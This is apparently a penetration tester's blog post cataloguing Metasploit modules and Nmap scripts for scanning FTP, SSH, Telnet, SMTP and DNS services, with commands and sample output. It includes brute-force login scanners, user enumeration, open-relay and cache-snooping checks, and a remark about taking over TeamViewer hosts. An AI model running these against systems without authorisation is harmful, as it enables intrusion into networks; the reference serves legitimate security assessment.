---
layout: post
title: "Learning from the field: Basic Network Hygiene"
date: 2016-03-03 13:47:44 +0530
comments: true
categories: 
---

So, by using <strong>intelligence gathering</strong> you have completed the normal scanning and banner grabbing. Yay!!. Now, it's time for some <strong>metasploit-fu</strong> and <strong>nmap-fu</strong>.

<!-- more --> 
So we start with creating a new workspace in the msfconsole for better work.

```
msfconsole -q -- Starts Metasploit Console quietly
workspace -a <Engagement_Name> -- Add a new workspace with the engagement name specified
workspace <Engagement_Name> -- Switch to the new workspace
```

Let's import all the nmap xml file of different network ranges
```
db_import /root/Documents/Project_Location/Engagement_Name/Internal/Site_10.*.*.0_*/nmap_scans/Port_Scan/*.xml
```

After all the importing, it's important to check what all services/ports are running to get a feel of different possibilities.
```
services -c port,name -u -o /tmp/ports 
^ -u is used for only showing ports which are open.
```
This will write a file in /tmp/ports containing the port number and it's name. info could also be used to get more information.

```
cat /tmp/ports | cut -d , -f2,3 | sort | uniq | tr -d \" | grep -v -E 'port|tcpwrapped' | sort -n
```
This will provide you the sorted ports running on the network which can be then viewed to probe further.

A sample output is
```
***SNIP**
20,ftp-data
21,ftp
22,ssh
23,landesk-rc
23,telnet
24,priv-mail
25,smtp
25,smtp-proxy
***SNIP**
```

Let's move <strong>port by port</strong> and check what metasploit framework and nmap nse has to offer. By no means, this is a complete list, new ports, metasploit modules, nmap nse will be added as used. This post currently covers the below ports / services.
<ul>
<li>FTP | Port 21</li>
<li>SSH | Port 22</li>
<li> Telnet | Port 23</li>
<li>SMTP | Port 25 and Submission Port 587</li>
<li> DNS | Port 53</li>
<li>Finger | Port 79</li>
<li>HTTP </li>
<li>POP3 | Port 110</li>
<li>RPCInfo | Port 111</li>
<li>Ident | Port 113</li>
<li>SNMP | Port 161</li>
<li>Check Point FireWall-1 Topology | Port 264 </li>
<li>LDAP | Port 389</li>
<li>SMB | Port 445</li>
<li>rexec | Port 512</li>
<li>rlogin | Port 513</li>
<li>RSH | port 514</li>
<li>AFP | Apple Filing Protocol | Port 548</li>
<li>Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593</li>
<li>HTTPS | Port 443 and 8443 </li>
<li>RTSP | Port 554 and 8554</li>
<li>Rsync | Port 873</li>
<li>Java RMI | Port 1099</li>
<li>MS-SQL | Port 1433</li>
<li>Oracle | Port 1521</li>
<li>MySQL | Port 3306</li>
<li>Postgresql | Port 5432</li>
<li>VNC | Port 5900</li>
<li>X11 | Port 6000</li>
<li>PJL | Port 9100</li>
<li>Apache Cassandra | Port 9160</li>
<li>Network Data Management Protocol (ndmp) | Port 10000</li>
<li>Memcache | Port 11211</li>
<li>MongoDB | Port 27017 and Port 27018</li>
<li>EthernetIP-TCP-UDP | Port 44818</li>
<li> UDP BACNet | Port 47808</li>
</ul>

###FTP | Port 21
So, on a network we can find multiple version of ftp servers running. Let's find out by
```
services -p 21 -c info -o /tmp/ftpinfo
cat /tmp/ftpinfo | cut -d , -f2 | sort | uniq
```
A Sample output is
```
"Alfresco Document Management System ftpd"
"D-Link Printer Server ftpd"
"FreeBSD ftpd 6.00LS"
"HP JetDirect ftpd"
"HP LaserJet P4014 printer ftpd"
"Konica Minolta bizhub printer ftpd"
"Microsoft ftpd"
"National Instruments LabVIEW ftpd"
"NetBSD lukemftpd"
"Nortel CES1010E router ftpd"
"oftpd"
"OpenBSD ftpd 6.4 Linux port 0.17"
"PacketShaper ftpd"
"ProFTPD 1.3.3"
"Pure-FTPd"
"Ricoh Aficio MP 2000 printer ftpd 6.15"
"Ricoh Aficio MP 2000 printer ftpd 6.17"
"Ricoh Aficio MP 2352 printer ftpd 10.67"
"Ricoh Aficio MP 4002 printer ftpd 11.103"
"Ricoh Aficio MP W3600 printer ftpd 6.15"
"Ricoh Aficio SP 3500SF printer ftpd 75905e"
"vsftpd"
"vsftpd 2.0.4+ (ext.3)"
"vsftpd 2.0.5"
"vsftpd 2.0.8 or later"
"vsftpd 2.2.2"
"vsftpd 3.0.2"
"vsftpd (before 2.0.8) or WU-FTPD"
"WU-FTPD or MIT Kerberos ftpd 5.60"
"WU-FTPD or MIT Kerberos ftpd 6.00L
```

<strong>Metasploit</strong> provides
<ol>
<li> <strong>FTP Version Scanner</strong> which detects the ftp version.
This can be done using
```
use auxiliary/scanner/ftp/ftp_version
services -p 21 -R
```
Sample Output:
```
[*] 172.16.xx.xx:21 FTP Banner: '220 BDL095XXXX FTP server ready.\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 ProFTPD 1.3.2 Server (ProFTPD Default Installation) [172.16.110.51]\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-D1 FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-Dev FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
[*] Auxiliary module execution completed
```
</li>

<li><strong>Anonymous FTP Access Detection</strong> which detect anonymous (read/write) FTP server access.
```
use auxiliary/scanner/ftp/anonymous
services -p 21 -R
```
A sample of results is
```
[+] 10.10.xx.xx:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)
[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)
```
</li>
 
<li><strong>FTP Authentication Scanner</strong> which is a FTP Authentication Scanner which will test FTP logins on a range of machines and report successful logins.
```
use auxiliary/scanner/ftp/ftp_login
services -p 21 -R
```
Sample Output:
```
Yet to run
```
</li>
<li><strong>FTP Bounce Port Scanner</strong> which enumerate TCP services via the FTP bounce PORT/LIST method.
```
use auxiliary/scanner/portscan/ftpbounce
```</li>
</ol>

<strong>Nmap</strong> has 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ftp-anon.html">ftp-anon.nse</a> : Checks if an FTP server allows anonymous logins. If anonymous is allowed, gets a directory listing of the root directory and highlights writeable files.
<br>
<br>
Sample Output:
```
nmap -sV --script ftp-anon -p 21 10.10.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 21:53 IST
Nmap scan report for 10.10.xx.xx
Host is up (0.018s latency).
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.2.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 25  2011 pub
Service Info: OS: Unix
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ftp-brute.html">ftp-brute.nse</a> : Performs brute force password auditing against FTP servers.</li>
<li><a href="https://nmap.org/nsedoc/scripts/ftp-bounce.html">ftp-bounce.nse</a> : Checks to see if an FTP server allows port scanning using the FTP bounce method.</li>
</ol>

###SSH | Port 22
<strong>Metasploit</strong> has

<ol>
<li> <strong>SSH Version Scanner</strong> which detects SSH version.
```
use auxiliary/scanner/ssh/ssh_version
services -p 22 -u -R
```
A Sample output
```
[*] 10.23.xx.xx:22 SSH server version: SSH-2.0-OpenSSH_5.8 ( service.version=5.8 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH )
[*] 10.23.xx.xx:22 SSH server version: SSH-2.0-9nroL
[*] 10.23.xx.xx:22 SSH server version: SSH-1.99-Cisco-1.25 ( service.version=1.25 service.vendor=Cisco service.product=SSH os.vendor=Cisco os.product=IOS os.certainty=0.8 )
```
</li>
There's a auxilary module to try 
<li><strong>SSH Brute force</strong> which is SSH Login Check Scanner will test ssh logins on a range of machines and report successful logins. Caution: BruteForce.
```
use auxiliary/scanner/ssh/ssh_login
services -p 22 -u -R
```
</li>
</ol>

<strong>Nmap</strong> has three NSE
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html">ssh2-enum-algos.nse</a> Reports the number of algorithms (for encryption, compression, etc.) that the target SSH2 server offers. If verbosity is set, the offered algorithms are each listed by type.
<br>
<br>
Sample Output:
```
nmap --script ssh2-enum-algos -p 22 -n 103.206.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 22:04 IST
Nmap scan report for 103.206.xx.xx
Host is up (0.018s latency).
PORT   STATE SERVICE
22/tcp open  ssh
| ssh2-enum-algos: 
|   kex_algorithms: (4)
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group-exchange-sha1
|       diffie-hellman-group14-sha1
|       diffie-hellman-group1-sha1
|   server_host_key_algorithms: (2)
|       ssh-dss
|       ssh-rsa
|   encryption_algorithms: (9)
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-cbc
|       aes192-cbc
|       aes256-cbc
|       blowfish-cbc
|       3des-cbc
|       none
|   mac_algorithms: (2)
|       hmac-sha1
|       hmac-md5
|   compression_algorithms: (1)
|_      none

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssh-hostkey.html">ssh-hostkey.nse</a>: Shows SSH hostkeys
<br>
<br>
Sample Output:
```
nmap --script ssh-hostkey -p 22 -n 103.206.xx.xx --script-args ssh_hostkey=full

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 22:07 IST
Nmap scan report for 103.206.xx.xx
Host is up (0.019s latency).
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   ssh-dss AAAAB3NzaC1kc3MAAACBAOohTo8BeSsafI78mCTp7vz1ETkdSXNj8wgrYMD+DOEDpdfMEqYJOFPUWiyK0HrkyrP7UyODp9SEcrOzem98iDUgvPZFfSRhKpdTktQtt9+9mzDpfHgqryD04o2JvjZc6HlMwZToulurZwgt0+npep8Asb32lRCGAkFpPA7r3NdfAAAAFQDypzDnHTTgcy/vQNUDe+RlnFxX0wAAAIAXBBnv/P1RyzGdGM+JX2tbM6gJvC4WNoq7Okdh1ZH2Rxn1plU+oTt189ZI5UcR67x504o5fXVZ0pj3yJh6yMQFfsw89iSbTGmM6V1wYnq+s1Lz83XvgHIepV0OdOj2HE4tCytS6md0udLSio6RlWTVG/8vFrwb/C2KoL36JiIABgAAAIAUTOQm2+LVNqISuZT/doDbz5H89dCbLyL0uNiPRGW3XGjsZrW/iyvN/FQ1Lz0vai1db3UPbkNvhQNhOIJtAYClyQg1bTjvBCV2YvG9P91Ljyl6avSUoPEDg7h46E90TpneFa0tRf+V3RBC4KbXHrelgHye+2ZUkaebOmsRt2h4sQ==
|_  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIRocXKgi0l3kZeVNEPlMXBBDj4WYAPFzNgf63+e/RMN5DSYz4AmVw1V8o+gsaL3mCeMwRdMfPCVlDdFPRDbZhyXNiG2vstc+gbeOHyDaLuQJVMF/++M8Yw9GWr7dOOA9zUfRkYVrQT53bfYzSpiulZpAbnkY0X5Ma40aO56Sq4H1NNqb7ZBdCWmder3veBq+6R9z+xSY0ji5Csr52bIl2Bka36KfYx325rrUP//lWDUDwK+hQ8jL9EjP884uPflRJPqdxoWLK001exSPHmcZOFNCeb2TQSkTbJVIh5Qg55eel2d0f/YZe24b6SalaANsZHt9MyG6Q5DNbtWvV2ixV

Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/sshv1.html">sshv1.nse</a>: Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.
<br>
<br>
Sample Output:
```
nmap --script sshv1 -p 22 -n 203.134.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 23:16 IST
Nmap scan report for 203.134.xx.xx
Host is up (0.042s latency).
PORT   STATE SERVICE
22/tcp open  ssh
|_sshv1: Server supports SSHv1
```
</li>
</ol>

### Telnet | Port 23
<strong>Metasploit</strong> has
<ol>
<li><strong>Telnet version</strong> which detects telnet version.
```
use auxiliary/scanner/telnet/telnet_version
services -p 23 -u -R
```
Sample Output
```
[*] 10.13.xx.xx:23 TELNET (ttyp0)\x0d\x0a\x0d\x0alogin:
[*] 10.13.xx.xx:23 TELNET User Access Verification\x0a\x0aUsername:
```
One sad thing is telnet_version overwrites the Nmap banner, which is most probably not good. Need to check how we can avoid this. may be not run version modules?

We could have used nmap banners for telnet for example: below for the SNMP modules. As routers/switches are mostly uses SNMP. 
```
10.23.xx.xx   23    tcp    telnet      open   Usually a Cisco/3com switch
10.23.xx.xx   23    tcp    telnet      open   Aruba switch telnetd
10.87.xx.xx    23    tcp    telnet      open   Dell PowerConnect switch telnetd
10.10.xx.xx   23    tcp    telnet      open   Cisco router telnetd
10.10.xx.xx    23    tcp    telnet      open   Pirelli NetGate VOIP v2 broadband router telnetd
```
</li>

<li><strong>Telnet Login Check Scanner</strong> which will test a telnet login on a range of machines and report successful logins.
```
use auxiliary/scanner/telnet/telnet_login
services -p 23 -u -R
```
</li>
</ol>

<strong>Nmap</strong> has two NSEs
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/telnet-brute.html">telnet-brute.nse</a> : Performs brute-force password auditing against telnet servers.</li>
and 
<li><a href="https://nmap.org/nsedoc/scripts/telnet-encryption.html">telnet-encryption.nse</a> : Determines whether the encryption option is supported on a remote telnet server. </li>
</ol>

###SMTP | Port 25 and Submission Port 587
<strong>Metasploit</strong> has 
<ol>
<li><strong>SMTP_Version</strong> which is a SMTP Banner Grabber.

```
use auxiliary/scanner/smtp/smtp_version
services -p 25 -u -R
```

Sample Output
```
[*] 10.10.xx.xx:25 SMTP 220 xxxx.example.com Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:22:44 +0530 \x0d\x0a
[*] 10.10.xx.xx:25 SMTP 220 smtpsrv.example.com ESMTP Sendmail; Thu, 3 Mar 2016 18:22:39 +0530\x0d\x0a
```
</li>

<li><strong>SMTP Open Relays</strong> which tests if an SMTP server will accept (via a code 250) an e-mail by using a variation of testing methods
```
use auxiliary/scanner/smtp/smtp_relay
services -p 25 -u -R
```
You might want to change MAILFROM and MAILTO, if you want to see if they are actual open relays client might receive emails.
<br>
<br>
Sample Output:
```
[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:<sender@example.com> -> RCPT TO:<target@example.com>
[*] 172.16.xx.xx:25 - No relay detected
[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:<sender@example.com> -> RCPT TO:<target@example.com>
```

</li>

<li><strong>SMTP User Enumeration Utility</strong> which allows allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users. User files contains only Unix usernames so it skips the Microsoft based Email SMTP Server. This can be changed using UNIXONLY option and custom user list can also be provided.

```
use auxiliary/scanner/smtp/smtp_enum
services -p 25 -u -R
```


Sample Output
```
[*] 10.10.xx.xx:25 Skipping microsoft (220 ftpsrv Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:49:49 +0530 )
[+] 10.10.xx.xx:25 Users found: adm, admin, avahi, avahi-autoipd, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
[+] 10.10.xx.xx:25 Users found: adm, avahi, avahi-autoipd, backup, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
```
</li>
</ol>

<strong>Nmap NSE</strong> has 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-brute.html">smtp-brute.nse</a> : Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-commands.html">smtp-commands.nse</a> : Attempts to use EHLO and HELP to gather the Extended commands supported by an SMTP server.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-enum-users.html">smtp-enum-users.nse</a> Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO commands. The goal of this script is to discover all the user accounts in the remote system. Similar to SMTP_ENUM in metasploit.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-open-relay.html">smtp-open-relay.nse</a> Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal of this script is to tell if a SMTP server is vulnerable to mail relaying.
<br>
<br>
Sample Output:
```
nmap -iL email_servers -v --script=smtp-open-relay -p 25
Nmap scan report for 10.10.xx.xx
Host is up (0.00039s latency).
PORT     STATE  SERVICE
25/tcp   open   smtp
| smtp-open-relay: Server is an open relay (14/16 tests)
|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@sysmailsrv.example.com> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest%nmap.scanme.org@[10.10.8.136]>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<relaytest%nmap.scanme.org@sysmailsrv.example.com>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest@nmap.scanme.org">
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest%nmap.scanme.org">
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<"relaytest@nmap.scanme.org"@[10.10.8.136]>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<@[10.10.8.136]:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<@sysmailsrv.example.com:relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest>
|  MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest@[10.10.8.136]>
|_ MAIL FROM:<antispam@[10.10.xx.xx]> -> RCPT TO:<nmap.scanme.org!relaytest@sysmailsrv.example.com>
MAC Address: 00:50:56:B2:21:A9 (VMware)
```
</li>
</ol>

### DNS | Port 53

<strong>Metasploit</strong> provides
<ol>

<li><strong>DNS Bruteforce Enumeration</strong>:  which uses a dictionary to perform a bruteforce attack to enumerate hostnames and subdomains available under a given domain
```
use auxiliary/gather/dns_bruteforce
```
Sample Output:
```
[+] Host autodiscover.example.com with address 10.10.xx.xx found
[+] Host b2b.example.com with address 10.10.xx.xx found
[+] Host blog.example.com with address 10.10.xx.xx found
```</li>

<li><strong>DNS Basic Information Enumeration</strong> : This module enumerates basic DNS information for a given domain. The module gets information regarding to A (addresses), AAAA (IPv6 addresses), NS (name servers), SOA (start of authority) and MX (mail servers) records for a given domain. In addition, this module retrieves information stored in TXT records.

```
use auxiliary/gather/dns_info
```

Sample Output:
```
[*] Enumerating example.com
[+] example.com - Address 93.184.xx.xx found. Record type: A
[+] example.com - Address 2606:2800:220:1:248:1893:25c8:1946 found. Record type: AAAA
[+] example.com - Name server a.iana-servers.net (199.43.xx.xx) found. Record type: NS
[+] example.com - Name server a.iana-servers.net (2001:500:8c::53) found. Record type: NS
[+] example.com - Name server b.iana-servers.net (199.43.xx.xx) found. Record type: NS
[+] example.com - Name server b.iana-servers.net (2001:500:8d::53) found. Record type: NS
[+] example.com - sns.dns.icann.org (199.4.xx.xx) found. Record type: SOA
[+] example.com - sns.dns.icann.org (64:ff9b::c704:1c1a) found. Record type: SOA
[+] example.com - Text info found: v=spf1 -all . Record type: TXT
[+] example.com - Text info found: $Id: example.com 4415 2015-08-24 20:12:23Z davids $ . Record type: TXT
[*] Auxiliary module execution completed
```</li>

<li><strong>DNS Reverse Lookup Enumeration</strong>: This module performs DNS reverse lookup against a given IP range in order to retrieve valid addresses and names.
```
use auxiliary/gather/dns_reverse_lookup
```
</li>
<li> <strong>DNS Common Service Record Enumeration</strong> : This module enumerates common DNS service records in a given domain.
<br>
Sample Output:
```
use auxiliary/gather/dns_srv_enum
set domain example.com
run

[*] Enumerating SRV Records for example.com
[+] Host: sipfed.online.lync.com IP: 10.10.xx.xx Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
[+] Host: sipfed.online.lync.com IP: 2a01:XXX:XXXX:2::b Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
[*] Auxiliary module execution completed
```</li>

<li><strong>DNS Record Scanner and Enumerator</strong> : This module can be used to gather information about a domain from a given DNS server by performing various DNS queries such as zone transfers, reverse lookups, SRV record bruteforcing, and other techniques.

```
use auxiliary/gather/enum_dns
```

Sample Output:
```
[*] Setting DNS Server to zonetransfer.me NS: 81.4.xx.xx
[*] Retrieving general DNS records
[*] Domain: zonetransfer.me IP address: 217.147.xx.xx Record: A 
[*] Name: ASPMX.L.GOOGLE.COM. Preference: 0 Record: MX
[*] Name: ASPMX3.GOOGLEMAIL.COM. Preference: 20 Record: MX
[*] Name: ALT1.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
[*] Name: ASPMX5.GOOGLEMAIL.COM. Preference: 20 Record: MX
[*] Name: ASPMX2.GOOGLEMAIL.COM. Preference: 20 Record: MX
[*] Name: ASPMX4.GOOGLEMAIL.COM. Preference: 20 Record: MX
[*] Name: ALT2.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
[*] zonetransfer.me.        301     IN      TXT     
[*] Text: zonetransfer.me.        301     IN      TXT     
[*] Performing zone transfer against all nameservers in zonetransfer.me
[*] Testing nameserver: nsztm2.digi.ninja.
W, [2016-04-05T22:53:16.834590 #15019]  WARN -- : AXFR query, switching to TCP
W, [2016-04-05T22:53:17.490698 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
W, [2016-04-05T22:53:32.047468 #15019]  WARN -- : Nameserver 167.88.xx.xx not responding within TCP timeout, trying next one
F, [2016-04-05T22:53:32.047746 #15019] FATAL -- : No response from nameservers list: aborting
[-] Zone transfer failed (length was zero)
[*] Testing nameserver: nsztm1.digi.ninja.
W, [2016-04-05T22:53:33.269318 #15019]  WARN -- : AXFR query, switching to TCP
W, [2016-04-05T22:53:33.804121 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
W, [2016-04-05T22:53:48.481319 #15019]  WARN -- : Nameserver 81.4.xx.xx not responding within TCP timeout, trying next one
F, [2016-04-05T22:53:48.481519 #15019] FATAL -- : No response from nameservers list: aborting
[-] Zone transfer failed (length was zero)
[*] Enumerating SRV records for zonetransfer.me
[*] SRV Record: _sip._tcp.zonetransfer.me Host: www.zonetransfer.me. Port: 5060 Priority: 0
[*] Done
[*] Auxiliary module execution completed
```
</li>
Two interesting metasploit modules which we found are
<li>
<strong>DNS Amplification Scanner</strong> which tests for the DNS Amplification Tests.
```
auxiliary/scanner/dns/dns_amp
services -p 53 -u -R
```
Sample Output:
```
[*] Sending 67 bytes to each host using the IN ANY isc.org request
[+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
[+] 10.10.xx.xx:53 - Response is 417 bytes [6.22x Amplification]
[+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
[+] 10.10.xx.xx:53 - Response is 230 bytes [3.43x Amplification]
```
</li>
<li><strong>DNS Non-Recursive Record Scraper</strong> which can be used to scrape records that have been cached by a specific nameserver. Thinking of what all can be discovered from this module is the antivirus softwares used by the company, websites visited by the employees. It uses dns norecurse option.

```
use auxiliary/gather/dns_cache_scraper 
```

Sample Output:
```
[*] Making queries against 103.8.xx.xx
[+] dnl-01.geo.kaspersky.com - Found
[+] downloads2.kaspersky-labs.com - Found
[+] liveupdate.symantecliveupdate.com - Found
[+] liveupdate.symantec.com - Found
[+] update.symantec.com - Found
[+] update.nai.com - Found
[+] guru.avg.com - Found
[*] Auxiliary module execution completed
```</li>
</ol>

<strong>Nmap</strong> has around 19-20 NSE Scripts for DNS, we haven't mentioned all the NSE here, only which we were able to use.:
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html">broadcast-dns-service-discovery.nse</a> Attempts to discover hosts' services using the DNS Service Discovery protocol. It sends a multicast DNS-SD query and collects all the responses.
<br>
<br>
Sample Output:
```
 nmap --script=broadcast-dns-service-discovery

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-12 14:53 IST
Pre-scan script results:
| broadcast-dns-service-discovery: 
|   172.30.xx.xx
|     9/tcp workstation
|       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
|     22/tcp udisks-ssh
|       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
|   172.30.xx.xx
|     2020/tcp teamviewer
|       DyngateID=164005815
|       Token=CrzebHH5rkzIEBsP
|       UUID=119e36d8-4366-4495-9e13-c44be02851f0
|_      Address=172.30.xx.xx fe80:0:0:0:69ab:44d5:e21d:738e
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 7.24 seconds
```

It's surprising why teamviewer will broadcast it's ID, then we mostly need 4 digit pin just to control the machine.
</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-blacklist.html">dns-blacklist.nse</a> ( External IP Only ) Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists and returns a list of services for which an IP has been flagged</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-brute.html">dns-brute.nse</a>: This is similar to the msf dns_bruteforce module. Attempts to enumerate DNS hostnames by brute force guessing of common subdomains.
<br>
<br>
Sample Output:
```
nmap --script dns-brute www.example.com -sn -n -Pn

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:23 IST
Nmap scan report for www.example.com (116.50.xx.xx)
Host is up.
Other addresses for www.example.com (not scanned): 64:ff9b::7432:4fd0

Host script results:
| dns-brute: 
|   DNS Brute-force hostnames: 
|     mx1.example.com - 64:ff9b:0:0:0:0:cbc7:2989
|     images.example.com - 116.50.xx.xx
|     images.example.com - 64:ff9b:0:0:0:0:7432:404b
|     dns.example.com - 116.50.xx.xx
|     dns.example.com - 64:ff9b:0:0:0:0:7432:42e6
|     web.example.com - 203.199.xx.xx
|     web.example.com - 64:ff9b:0:0:0:0:cbc7:2911
|     exchange.example.com - 203.199.xx.xx
|     mail.example.com - 116.50.xx.xx
|     exchange.example.com - 64:ff9b:0:0:0:0:cbc7:29a7
|     mail.example.com - 64:ff9b:0:0:0:0:7432:4fe7
|     blog.example.com - 116.50.xx.xx
|     blog.example.com - 64:ff9b:0:0:0:0:7432:4ebb
|     www.example.com - 116.50.xx.xx
|     www.example.com - 64:ff9b:0:0:0:0:7432:4fd0
|     sip.example.com - 116.50.xx.xx
|     sip.example.com - 116.50.xx.xx
|     sip.example.com - 64:ff9b:0:0:0:0:7432:4e56
|     sip.example.com - 64:ff9b:0:0:0:0:7432:4ec9
|     mobile.example.com - 116.50.xx.xx
|_    mobile.example.com - 64:ff9b:0:0:0:0:7432:4e18

Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-cache-snoop.html">dns-cache-snoop.nse</a> : This module is similar to dns_cache_scraper. Performs DNS cache snooping against a DNS server. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with "www." and once without. Use the dns-cache-snoop.domains script argument to use a different list.
<br>
<br>
Sample Output with no arguments:
```
nmap -sU -p 53 --script dns-cache-snoop.nse 103.8.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:30 IST
Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)
Host is up (0.067s latency).
PORT   STATE SERVICE
53/udp open  domain
| dns-cache-snoop: 83 of 100 tested domains are cached.
| google.com
| www.google.com
| facebook.com
| www.facebook.com
| youtube.com
| www.youtube.com
| yahoo.com
| www.yahoo.com
```

Sample Output with custom list of websites:
```
nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={dnl-01.geo.kaspersky.com,update.symantec.com,host3.com}' 103.8.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:33 IST
Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)
Host is up (0.11s latency).
PORT   STATE SERVICE
53/udp open  domain
| dns-cache-snoop: 2 of 3 tested domains are cached.
| dnl-01.geo.kaspersky.com
|_update.symantec.com
```
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-check-zone.html">dns-check-zone.nse</a> :  Checks DNS zone configuration against best practices, including RFC 1912. The configuration checks are divided into categories which each have a number of different tests.
<br>
<br>
Sample Output:
```
nmap -sn -Pn aster.example.co.in --script dns-check-zone --script-args='dns-check-zone.domain=example.com'

Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:33 IST
Nmap scan report for aster.example.co.in (202.191.xx.xx)
Host is up.
Other addresses for aster.example.co.in (not scanned): 64:ff9b::cabf:9a42
rDNS record for 202.191.xx.xx: segment-202-191.sify.net

Host script results:
| dns-check-zone: 
| DNS check results for domain: example.com
|   MX
|     PASS - Reverse MX A records
|       All MX records have PTR records
|   SOA
|     PASS - SOA REFRESH
|       SOA REFRESH was within recommended range (3600s)
|     PASS - SOA RETRY
|       SOA RETRY was within recommended range (600s)
|     PASS - SOA EXPIRE
